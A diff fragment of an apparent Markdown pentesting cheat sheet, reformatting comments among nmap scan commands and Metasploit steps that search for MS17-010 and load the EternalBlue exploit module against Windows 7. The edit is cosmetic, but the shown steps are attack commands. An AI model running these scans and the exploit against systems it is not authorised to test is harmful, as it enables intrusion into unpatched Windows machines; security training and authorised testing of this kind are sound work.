@@ -27,11 +27,11 @@ Find what services are running on open ports:
 > nmap -sS -Pn -A 192.168.1.5
 ```
 #### Use Metasploit for Pintesting Windows 7
-Get open ports
 ```
+  // Get open ports:
 > nmap -sS -sV put-target-ip-here-or-a-range -A -O -v
 > msfconsole
-  // use MS17010 for Windows 7 
+  // use MS17010 for Windows 7: 
 > search MS17-010
 > use exploit/windows/smb/ms_17_010_eternalblue
   // or
